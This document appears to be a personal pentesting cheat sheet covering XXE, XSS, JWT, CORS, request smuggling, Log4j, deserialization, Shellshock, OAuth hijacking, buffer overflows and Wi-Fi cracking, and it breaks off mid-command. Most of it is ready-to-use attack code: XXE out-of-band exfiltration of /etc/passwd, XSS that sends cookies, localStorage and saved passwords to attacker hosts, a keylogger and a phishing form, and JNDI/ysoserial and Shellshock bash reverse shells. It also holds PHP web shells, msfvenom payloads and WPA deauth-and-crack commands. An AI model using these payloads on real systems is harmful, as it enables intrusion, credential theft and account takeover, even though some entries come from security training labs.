\u0026lt;!DOCTYPE data [ \u0026lt;!ELEMENT data ANY \u0026gt; \u0026lt;!ENTITY lastname \u0026#34;Replaced\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;Contact\u0026gt; \u0026lt;lastName\u0026gt;\u0026amp;lastname;\u0026lt;/lastName\u0026gt; \u0026lt;firstName\u0026gt;Tom\u0026lt;/firstName\u0026gt; \u0026lt;/Contact\u0026gt; Retrieving files \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ELEMENT data ANY \u0026gt; \u0026lt;!ENTITY lastname SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;Contact\u0026gt; \u0026lt;lastName\u0026gt;\u0026amp;lastname;\u0026lt;/lastName\u0026gt; \u0026lt;firstName\u0026gt;Tom\u0026lt;/firstName\u0026gt; \u0026lt;/Contact\u0026gt; Out of band Testing ssrf \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ELEMENT data ANY \u0026gt; \u0026lt;!ENTITY lastname SYSTEM \u0026#34;http://\u0026lt;our ip address\u0026gt;/somefile\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;Contact\u0026gt; \u0026lt;lastName\u0026gt;\u0026amp;lastname;\u0026lt;/lastName\u0026gt; \u0026lt;firstName\u0026gt;Tom\u0026lt;/firstName\u0026gt; \u0026lt;/Contact\u0026gt; Out of band dtd contents \u0026lt;!ENTITY % content SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % external \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; exfil SYSTEM \u0026#39;http://your ip address/out?%content;\u0026#39;\u0026gt;\u0026#34; \u0026gt; \u0026lt;!ENTITY % content SYSTEM \u0026#34;file:///etc/timezone\u0026#34;\u0026gt; \u0026lt;!ENTITY % external \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; exfil SYSTEM \u0026#39;http://your ip address/out?%content;\u0026#39;\u0026gt;\u0026#34; \u0026gt; send this\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE oob [ \u0026lt;!ENTITY % base SYSTEM \u0026#34;http://your ip address/external.dtd\u0026#34;\u0026gt; %base; %external; %exfil; ]\u0026gt; \u0026lt;entity-engine-xml\u0026gt; \u0026lt;/entity-engine-xml\u0026gt; XPATH PayloadAlltheThings ' or 1=1}/parent::*/child::node()%00 XSS js can access cookies if they DO NOT HAVE the httpOnly flag enabled. PayloadAlltheThings Test in all inputs and params \u0026lt;script\u0026gt;fetch('/settings?new_password=pass123');\u0026lt;/script\u0026gt;? \u0026lt;script src=\u0026quot;http://192.168.49.194:8000/xss.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; all tags blocked? use custom tag \u0026lt;script\u0026gt; location = \u0026#39;https://acd21f001f9a7723c0f207c1008700d5.web-security-academy.net/?search=\u0026lt;xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1\u0026gt;#x\u0026#39;; \u0026lt;/script\u0026gt; not sure but this worked, from burpsuite acad %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E \u0026lt;script\u0026gt;document.write('\u0026lt;iframe src=file:///etc/passwd\u0026gt;\u0026lt;/iframe\u0026gt;');\u0026lt;/script\u0026gt; read file xss? Keylogger function logKey(event){ fetch(\u0026#34;http://attacker:8000/k?key=\u0026#34;+ event.key) } document.addEventListener(\u0026#39;keydown\u0026#39;, logKey); Ref: https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event\nReflected XSS Craft malicious link \u0026gt; send to victim\nSearch functions http://blah.com/search?=\u0026lt;sCript\u0026gt;alert(1)\u0026lt;/sCript\u0026gt; Reflected Client XSS \u0026lt;img src='x' onerror='alert(1)'\u0026gt; \u0026lt;sCript\u0026gt; tag shouldn\u0026rsquo;t run in inner.html so use the above Steal Cookie let cookie = document.cookie let encodedCookie = encodeURIComponent(cookie) fetch(\u0026#34;http://attackerlistener:8000/exfil?data=\u0026#34; + encodedCookie) Local Secrets localStorage \u0026gt; accessed using window.localStorage sessionStorage \u0026gt; accessed using window.sessionStorage keeps data until tab is closed let data = JSON.stringify(localStorage) let encodedData = encodeURIComponent(data) fetch(\u0026#34;http://attackerlistener:8000/exfil?data=\u0026#34; + encodedData) Stealing saved passwords let body = document.getElementsByTagName(\u0026#34;body\u0026#34;)[0] var u = document.createElement(\u0026#34;input\u0026#34;); u.type = \u0026#34;text\u0026#34;; u.style.position = \u0026#34;fixed\u0026#34;; //u.style.opacity = \u0026#34;0\u0026#34;; var p = document.createElement(\u0026#34;input\u0026#34;); p.type = \u0026#34;password\u0026#34;; p.style.position = \u0026#34;fixed\u0026#34;; //p.style.opacity = \u0026#34;0\u0026#34;; body.append(u) body.append(p) setTimeout(function(){ fetch(\u0026#34;http://attacker.ip/k?u=\u0026#34; + u.value + \u0026#34;\u0026amp;p=\u0026#34; + p.value) }, 5000); stealing passwords external \u0026lt;script src=\u0026quot;http://myip/asd.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; store in target then host the following asd.js const newDiv = document.createElement(\u0026#34;script\u0026#34;); const newContent = document.createTextNode(\u0026#39;document.location=\u0026#34;http://192.168.49.191/?c=\u0026#34;+document.cookie\u0026#39;); newDiv.appendChild(newContent); const currentDiv = document.getElementById(\u0026#34;div1\u0026#34;); document.body.insertBefore(newDiv, currentDiv); or\ndocument.body.onload = addElement; function addElement () { // create a new script element const newDiv = document.createElement(\u0026#34;script\u0026#34;); const newContent = document.createTextNode(\u0026#39;window.location=\u0026#34;http://192.168.49.191/?c=\u0026#34; + document.cookie\u0026#39;); newDiv.appendChild(newContent); const currentDiv = document.getElementById(\u0026#34;div1\u0026#34;); document.body.insertBefore(newDiv, currentDiv); } or\n/// https://bobbyhadz.com/blog/javascript-create-image-element const image = document.createElement(\u0026#39;img\u0026#39;); // 👇️ Local image // image.setAttribute(\u0026#39;src\u0026#39;, \u0026#39;my-img.png\u0026#39;); // 👇️ Remote image image.setAttribute( \u0026#39;src\u0026#39;, \u0026#39;x\u0026#39;, ); image.onerror = function handleError() { fetch(\u0026#34;http://192.168.49.191/c?a=\u0026#34; + document.cookie) // 👇️ Can set image.src to a backup image here // image.src = \u0026#39;backup-image.png\u0026#39; // 👇️ Or hide image // image.style.display = \u0026#39;none\u0026#39;; }; image.onload = function handleImageLoaded() { fetch(\u0026#34;http://192.168.49.191/c?a=\u0026#34; + document.cookie) // 👇️ Can set image.src to a backup image here // image.src = \u0026#39;backup-image.png\u0026#39; // 👇️ Or hide image // image.style.display = \u0026#39;none\u0026#39;; }; const box = document.getElementById(\u0026#39;box\u0026#39;); box.appendChild(image); Phish em xss with \u0026lt;img src='x' onerror='window.location.href=\u0026quot;http://192.168.49.105/login3.html\u0026quot;'\u0026gt;\n\u0026lt;form action=\u0026#34;http://192.168.49.105/asd\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;h3 mb-3 fw-normal\u0026#34;\u0026gt;Please sign in\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;form-floating text-dark\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;floatingInput\u0026#34; placeholder=\u0026#34;name@example.com\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;floatingInput\u0026#34;\u0026gt;Username\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-floating text-dark\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;floatingPassword\u0026#34; placeholder=\u0026#34;Password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;floatingPassword\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;w-100 btn btn-lg btn-primary\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Sign in\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; JWT Hacktricks Netsparker JWT attacks\nHEADER, PAYLOAD, SIGNATURE Decode from base64 Try setting ALG to \u0026ldquo;none\u0026rdquo; should be small letters and then urlencode == then remove signature but leave the last . If you have the public key and the token is using RS256 \u0026gt; change to HS256 Script in /etc If there\u0026rsquo;s a Key ID or KID in the Header part - test for SQLi or Directory Traversal. \u0026quot;kid\u0026quot;:\u0026quot;../../../../dev/null\u0026quot; this will sign the token with dev/null which is empty Sometimes the output is not in quotes try to add quotes ex output: {\u0026quot;user\u0026quot;:admin} make it {\u0026quot;user\u0026quot;:\u0026quot;admin\u0026quot;} before encoding to base64 Edit: looks like this only applies in scripting, if done in jwt.io do not add quotes. still need to confirm try to replace kid value with command execution see Hacktricks link From pentesterlab {\u0026quot;typ\u0026quot;: \u0026quot;JWT\u0026quot;, \u0026quot;alg\u0026quot;: \u0026quot;HS256\u0026quot;, \u0026quot;kid\u0026quot;: \u0026quot;|\u0026lt;command\u0026gt;\u0026quot;} CVE-2017-17405 impacting Ruby Net::FTP bruteforce jwt secret using john john jwt.token --wordlist=wordlist.txt --format=HMAC-SHA256 SQLi in jwt see Hacktricks link. ' UNION SELECT 'ATTACKER';-- - then set the secret to ATTACKER Sometimes they don\u0026rsquo;t even verify the signature, so just try changing the user to admin. jku header devs can use public key from URLs inside using the jku header, attackers can host their self signed jwk file. Ippsec UniCode video Using Burp INSTALL JWT editor in burp and try the following\nalg to none\nBruteforce Signing key\nbruteforce weak key hashcat -a 0 -m 16500 \u0026lt;YOUR-JWT\u0026gt; /path/to/jwt.secrets.list generate new symmetric key use the bruteforced secret replace k value in key with base64 encoded secret Insert jwk\ngenerate an RSA key embed jwk Inject jku\ngenerate an rsa key copy as public jwk host edit the header add \u0026quot;jku\u0026quot;:\u0026quot;host location\u0026quot; edit the kid of the jwt to the same one within the public jwk sign the jwt done CORS Misconfiguration Check for Access-Control-Allow-Origin: and Access-Control-Allow-Credentials: in response. Add Origin header in request - try Null More payloads PayloadAlltheThings add Origin: header if it gets reflected in the response Access-Control-Allow-Origin: try offsecscript/cors/cors.html Samesite Some browsers will block a cookie with SameSite=None if the Secure flag is not also set.\nLax - not to send the cookie on cross-site requests. However, the browser will send the cookie during navigation when a user manually enters the URL in the browser or clicks a link to the site\nStrict - will only send cookie if the request is same domain with cookie\n\u0026lt;iframe sandbox=\u0026#34;allow-scripts allow-top-navigation allow-forms\u0026#34; srcdoc=\u0026#34;\u0026lt;script\u0026gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;$url/accountDetails\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;$exploit-server-url/log?key=\u0026#39;+encodeURIComponent(this.responseText); }; \u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Git Information Leak Check for .git directory wget -r then git diff git diff HEAD~1 or 2 and so on to show previous commit changes .git might not be accessible but /.git/HEAD or config might be. nice to check. git log Don\u0026rsquo;t forget to git init first 2 characters is directory c3646db7f9c7e6f126c75900fdcce16d50e1da82 = /.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82 git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82 HTTP Request Smuggling portswigger video Albinowax\u0026rsquo; research\nDetecting\nIssue an ambiguous request followed by a normal \u0026lsquo;victim\u0026rsquo; request, then observe whether the latter gets an unexpected response. prone to false negatives If CL.TE the following will cause an observable delay. If server is in sync this will get rejected OR harmlessly processed If TE.CL the front end will reject the message without ever forwarding to the backend because of invalid chunk size \u0026lsquo;Q\u0026rsquo;\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 4 1 Z Q If TE.CL\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 6 0 X ALWAYS test for CL.TE first if we do TE.CL and the server is CL.TE this will poison the backend and potentially harming legitimate users. Disable in Burp \u0026gt; Repeater \u0026gt; Update Content-Length Exploiting If CL.TE\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 6 0 X to exploit replace X with : GET /404 HTTP/1.1 X` IF TE.CL\nPOST / HTTP/1.1 Host: your-lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 FTP FTP SSL? openssl s_client -connect \u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt; -starttls ftp lftp lftp set ftp:ssl-force true set ssl:verify-certificate no connect \u0026lt;ip\u0026gt; username NFS showmount -e ip mount 10.10.10.10:/share Serializations PHP [SnoopySec] (https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html)\nLook for unserialize() Adding Tilde(~) when requesting PHP might show the source code look for _destruct() or _wakeup() Owasp Java serialized object often is encoded with these as the beginning characters ac ed for hex or rO0 for base64 look for readObject() method used to read and deserialize data from an InputStream Log4j java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026quot;https://c6c9-202-89-151-235.ngrok.io:8888/log4jrce\u0026quot; ${jndi:ldap://10.10.14.2:1337/a} ysoserial-modified java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/9002 0\u0026gt;\u0026amp;1' \u0026gt; ~/htb/logforge/ysoserial.ser Creates a serialized payload JNDI-exploit-kit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser Listens to port 1389 then sends ysoserial.ser after running ysoserial-modified we will get links for different versions for jdk to try out. ${jndi:ldap://10.10.14.6:1389/vojbuj} ${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}} or can be replaced with \u0026hellip;. to do nested thingy Using JRMPListener to send CommonsCollections java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 \u0026quot;**_CMD_**\u0026quot; **_this will set up a listener listening on port 1337. send your payload ${jndi:rmi://10.10.10.10:1337/a} and should receive something. public class Log4jRCE { static { try { String [] cmd={\u0026#34;touch\u0026#34;, \u0026#34;/tmp/TEST\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } } Apache Apache on 80 Tomcat on 8080 encoding of .. = %252e%252e Tomcat Hacktricks\naccess manager bypass \u0026lt;ip\u0026gt;/whatever/..;/manager/html msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.14.2 LPORT=9001 -f war -o hyst.war /manager/html/expire?path=/ 0xdf used this to test for log4j using Post and jndi payload as body One-Liners \u0026lt;?php system($_REQUESTS['hyst']); ?\u0026gt; \u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;]);?\u0026gt; \u0026lt;?php print exec('command'); ?\u0026gt; \u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt; ShellShock To detect nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh () { :;}; echo; **_CMD_** CMD SHOULD BE ABSOLUTE PATH /usr/bin/whoami Echo is used to add a blank space between headers and body output Try in User-Agent or Cookie curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.2/9001 0\u0026gt;\u0026amp;1\u0026quot;' http://10.10.10.56/cgi-bin/user.sh C app / binaries Use gdb / strace crash the app then have a look at /var/crashes use apport-unpack Node Ippsec gdb ./binary layout asm create a breakpoint break *(main+103) run jump to what ever jump *(main+109) GPG/PGP/ASC gpg2john test.asc \u0026gt; hash john --format=gpg hash --wordlist=rockyou.txt gpg --import \u0026lt;file.asc\u0026gt; gpg -d \u0026lt;creds.gpg\u0026gt; CBC-MAC IV is set as a cookie in response after logging in GraphiQL Look for /graphql enpoints - might show web based IDE - or convert the following to proper json and use burp - replace newline with \\n? and then insert it to query part of the post body. query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } onOperation onFragment onField } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } query MyQuery { __schema { types { name fields { name } } } } query Query { ptlabkeys { value } } Source Code Reviews GoldMine\nPHP Directory Traversal public static function list_files_for_user($username) { $base = \u0026#34;files/\u0026#34;.$username; ### Vulnerability as user controlled input is getting concatenated. user input can be `../../../etc/passwd?` if (!file_exists($base)) { mkdir($base); } return array_diff(scandir($base), array(\u0026#39;..\u0026#39;, \u0026#39;.\u0026#39;)); } File Upload Bypass public static function addfile($user) { $file = \u0026#34;files/\u0026#34;.basename($user).\u0026#34;/\u0026#34;.basename($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); if (!preg_match(\u0026#34;/\\.pdf/\u0026#34;, $file)) { #Does not stop the user from uploading shell.pdf.php need to add $ to properly regex. return \u0026#34;Only PDF are allowed\u0026#34;; } elseif (!move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $file)) { return \u0026#34;Sorry, there was an error uploading your file.\u0026#34;; } return NULL; } ASP.NET Views = contains html pages .cshtml extension = c#html, gets list of data from controller Model = data related = classes, sql statements, gives controller with list of objects Google Dorks site: include only results on a given hostname. intitle: filtest according to the title of a page. inurl: filters according to url of a resource. filetype: filters according to file extensions. - filters out keywords Buffer Overflow BOF Main goal is to overflow buffer space to overwrite EIP(Extended Instruction Pointer) Steps in BOF\nSpiking: Finding vulnerable part of the program Fuzzing: Sending characters to the vulnerable part of the program to break it Finding Offset: This is where the program crashes Overwrite the EIP using the Offset found Find the right module Shellcode Tools\nImmunity Debugger generic_send_tcp Spiking readelf -s program s_readline(); s_string(\u0026#34;TRUN \u0026#34;); s_string_variable(\u0026#34;0\u0026#34;); Metasploit module for pattern pattern_create.rb -l \u0026#34;bytes\u0026#34; pattern_offset -l \u0026#34;bytes\u0026#34; -q \u0026#34;what data is in EIP HEX\u0026#34; Bad Character Checker\nFinding Modules Finding Modules - Mona nasm_shell.rb msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC=thread -f c -a x86 -b \u0026quot;badcharacters\u0026quot; Shell example shellcode= \u0026quot;A\u0026quot; * 2002 + \u0026quot;\\xaf\\x11\\x50\\x62 - this address is from nasm_shell.rb JMP ESP\u0026quot; + \u0026quot;\\x90\u0026quot; * 32 + overflowfrommsfvenom OAuth Cheatsheet\nIn OAuth 2.0, the client requests access to resources controlled by the resource owner and hosted by the resource server and is issued a different set of credentials than those of the resource owner. Instead of using the resource owner\u0026rsquo;s credentials to access protected resources, the client obtains an access token.\nResource Owner = ME Resource Server = API I want to access Client = Web server that wants to access the API Auth server = OID server. OAuth 2.0 Oauth that uses implicit grant, this one does not request for a code but goes directly to ask for a token. Hijack account using redirect_uri Intercept the request that asks for a code change the redirect_uri to your server. send payload to victim. If the victim loads the payload your server will get a valid code to continue the flow and get a valid token of the victim EX. payload\n\u0026lt;iframe src=\u0026#34;https://oauth-ac361fb21ebd0c90c081232a02a0000f.web-security-academy.net/auth?client_id=onpkl0n5tyylthtolkxnr\u0026amp;redirect_uri=https://exploit-ac961f381edb0cdcc03b232201d80044.web-security-academy.net/exploit\u0026amp;response_type=code\u0026amp;scope=openid%20profile%20email\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Steal token via open redirect example from portswigger. \u0026lt;script\u0026gt; if (!document.location.hash) { window.location = \u0026#39;https://oauth-ac5c1fa71f183ad6c01d63bf029c0093.web-security-academy.net/auth?client_id=nl739ogh6wfprguffv3pu\u0026amp;redirect_uri=https://ac5f1fde1fef3aeec00463d7000f0082.web-security-academy.net/oauth-callback/../../../../post/next?path=https://exploit-ac5f1ff41fce3a1ec0366355011f0094.web-security-academy.net/exploit\u0026amp;response_type=token\u0026amp;nonce=-233235662\u0026amp;scope=openid%20profile%20email\u0026#39; } else { window.location = \u0026#39;/?\u0026#39;+document.location.hash.substr(1) } \u0026lt;/script\u0026gt; Steal token via comments example from portswigger. \u0026lt;iframe src=\u0026#34;https://oauth-ac5b1f091ebc87a7c0231e43020600b9.web-security-academy.net/auth?client_id=flf29axxxdwj96jjj8qi0\u0026amp;redirect_uri=https://ac441fd31e7c8793c0611e60007e0029.web-security-academy.net/oauth-callback/../post/comment/comment-form\u0026amp;response_type=token\u0026amp;nonce=-1552239120\u0026amp;scope=openid%20profile%20email\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;message\u0026#39;, function(e) { fetch(\u0026#34;/\u0026#34; + encodeURIComponent(e.data.data)) }, false) \u0026lt;/script\u0026gt; Business Logic Try setting values to negative then add positive value = free stuff? Try reaching max int value 2,147,483,647 Check registrations for example email characters limited to 255 PortSwigger Lab does change email function send confirmation email delete parameters? example in forgot password function delete current password? coupon codes? tried sending same code via repeater. alternate two codes. Better PTY? stty raw -echo always fails for me instead use rlwrap -car nc -lvnp 9001 then use the usual python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;);' Now you have clear autocomplete and everything! Privesc Stuff Linux linux exploit suggester.sh Sudo rights on a file? Do you own the file? edit. hijack variable Path variable Vulnerability Symlink? Has write permission to something linked to another file? change symlink with ln -fns /tmp/newlink /var/www/html/itemtolink DNS Port 53 Open\nNslookup SERVER \u0026lt;IP\u0026gt; Search for 127.0.0.1 and \u0026lt;IP\u0026gt; Zone Transfer dig axfr@\u0026lt;ip\u0026gt; \u0026lt;hostname\u0026gt; PHPINFO() Insomnia #1 \u0026lt;3\nCheck for file_uploads = on in phpinfo \u0026gt; meaning any php request will accept uploaded files MongoDB likes everything in json mongo \u0026lt;dbs\u0026gt; -u \u0026lt;user\u0026gt; -p db.tasks.insert({\u0026quot;cmd\u0026quot;:\u0026quot;/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom\u0026quot;}); Thick Client Testing Nmap box before installing target app then nmap again after install Microsoft Attack Surface Analyzer run before installing the target app then run again after Sysinternals DLL Hijacking fast as ffff scan sudo masscan 192.168.141.90 -p0-65535 --rate 1000 -e tun0 masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0 //might miss something sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms 192.168.141.90 -p- Wifi Pentesting sudo airmon-ng shows our device\u0026rsquo;s driver. kali@kali:~$ sudo airmon-ng PHY Interface Driver Chipset phy0 wlan0 ath9k_htc Qualcomm Atheros Communications AR9271 802.11n iw new command\nsudo iw dev wlan0 scan | egrep \u0026quot;DS Parameter set|SSID: get the channel\nsudo iw dev wlan0 interface add wlan0mon type monitor use wlan0 to setup wlan0mon in monitor mode\nsudo ip link set wlan0mon up bring wlan0mon up\nsudo iw dev wlan0mon info show wlan0mon info\nsudo iw dev wlan0mon interface del remove\nUse the following script so wireshark can scan all channels. Wireshark doesnt channel hop. or you can just use Airodump-ng :P\nfor channel in 1 6 11 2 7 10 3 8 4 9 5 do iw dev wlan0mon set channel ${channel} sleep 1 done sudo airmon-ng check \u0026lt;kill\u0026gt; checks for processes that might interfere with aircrack suite, adding kill will gracefully kill the processes identified. Airmon-ng Used to setup monitor mode\nsudo airmon-ng start \u0026lt;wlan0\u0026gt; will result to wlan0mon sudo iw dev wlan0mon info sudo airmon-ng stop wlan0mon Airodump-ng Used to capture raw 802.11 frames, suitable for collecting WEB IVs or WPA/WPA2 handshakes which will be used with Aircrack-ng\n-w prefix Saves the capture dump to the specified filename --bssid BSSID Filters Airodump-ng to only capture the specified BSSID -c channel(s) Forces Airodump-ng to only capture the specified channel(s) Sniffing with Airodump-ng\nsudo airodump-ng wlan0mon -c 2 The top portion provides information about detected APs along with the encryption in use, network names, etc. The lower portion provides information about stations sending frames and the associated AP. See Aircrack website for more info.\nsudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon -w outputs the file as cap1 Aireplay-ng Generate wireless traffic. Used with Aircrack-ng to crack WEP keys\nBasic Injection Test\nMake sure you are in the same CH as the AP sudo airmon-ng start wlan0 \u0026lt;CH#\u0026gt; sudo aireplay-ng -9 wlan0mon sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon Injection test specific SSID -e SSID/ESSID -a BSSID Aircrack-ng Nice Tut\nPut wlan0 to monitor mode sudo airodump-ng wlan0mon dump all wireless List down details of our target BSSID(Mac address of AP), Station(Client connected Mac address), AUTH(PSK) aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet. use airodump again against the specific AP target sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon this will save the result to wpa.cap Aireplay to deauth the client and capture 4-way Handshake sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon The -0 1 means Deauth once. Once client reconnects we will be able to capture a handshake let airodump run for a bit. Use aircrack to Crack the handshake aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap confirm passphrase airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap Failed to get a handshake?\nTry sending deauth as broadcast. omit -c 802.11w can\u0026rsquo;t do anything but to wait for a client to connect. Custom Wordlist for Aircrack\njtr crunch mangler Cracking with Hashcat\nconvert pcap to hccapx /usr/lib/hashcat-utils/cap2hccapx.bin \u0026lt;.pcap\u0026gt; output.hccapx hashcat -m 2500 output.hccapx \u0026lt;wordlist\u0026gt; Airolib-ng Used to compute Pairwise Master Keys(PMK)\necho wifu \u0026gt; essid.txt airolib-ng wifu.sqlite --import essid essid.txt airolib-ng wifu.sqlite --stat airolib-ng wifu.sqlite --import passwd \u0026lt;wordlist\u0026gt; airolib-ng wifu.sqlite --batch aircrack-ng -r wifu.sqlite \u0026lt;pcap\u0026gt; CoWPAtty Used for rainbow table attacks to crack WPA passphrases\ngenpmk -f \u0026lt;wordlist\u0026gt; -d outfile -s wifu kinda like airolib cowpatty -r \u0026lt;pcap\u0026gt; -d \u0026lt;outfilefromgenpmk\u0026gt; -s wifu SNMP snmp-check \u0026lt;ip\u0026gt; snmpwalk -c public -v1 -t 10 \u0026lt;ip\u0026gt; auxiliary/scanner/snmp/snmp_enum black hole mode enabled? theres an RCE for SMTP Tools NMAP -sv \u0026gt; Service Version \u0026gt; used for banner grabbing PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 scripts \u0026gt; /usr/share/nmap/scripts nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP Safe won\u0026rsquo;t do anything intrusive like write files on target, bruteforce, do high traffic stuff\nCewl sudo cewl -d 2 -m 5 -w Wordlist.txt example.com\nWfuzz parameter discovery\nburp-parameter-names.txt\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 \u0026quot;http://offsecwp:80/index.php?FUZZ=data\u0026quot;\nwfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d \u0026quot;log=admin\u0026amp;pwd=FUZZ\u0026quot; http://target:80/wp-login.php\nwfuzz -c -z file,/home/all3n/tools/SecLists/Passwords/rockyou.txt --hw 325 -d \u0026quot;username=bob\u0026amp;password=FUZZ\u0026quot; -b 'PHPSESSID=2455efd8379026e261ef78186cebfc42' http://192.168.191.121/dev/index.php\nTry fuzzing for files that ends with xml aswell and anyother types txt,csv,bak etc. Vhost fuzzing\nwfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H \u0026quot;Host: preprod-FUZZ.host.com\u0026quot; --hc 200 --hw 356 -t 100 10.10.10.101\nHakrawler Uses The wayback Machine to gather directories.\nShells php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,80);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,80);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 